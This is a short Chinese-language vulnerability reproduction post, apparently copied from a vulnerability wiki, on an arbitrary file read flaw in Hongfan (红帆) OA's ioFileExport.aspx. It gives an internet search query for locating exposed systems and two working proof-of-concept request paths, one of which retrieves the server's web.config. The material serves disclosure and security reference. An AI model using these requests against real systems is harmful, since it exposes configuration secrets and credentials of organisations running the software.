---
title: "红帆OA ioFileExport.aspx 任意文件读取漏洞"
date: 2026-10-17 09:13:07
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "红帆OA"
tags:
  - "红帆OA"
  - "任意文件读取"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

红帆OA ioFileExport.aspx文件存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器敏感信息

## 漏洞影响

```
红帆OA
```

## 网络测绘

```
app="红帆-ioffice"
```

## 漏洞复现

登录页面

![image-20220520142002215](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201420294.png)

验证POC, 读取web.config文件

```
/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/web.config&filename=test.txt&ContentType=application/octet-stream
```

![image-20220520142019955](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201420011.png)

```
/ioffice/prg/set/iocom/ioFileExport.aspx?url=/ioffice/Login.aspx&filename=test.txt&ContentType=application/octet-stream
```

![image-20220520142034423](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201420478.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E7%BA%A2%E5%B8%86OA-ioFileExport.aspx-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
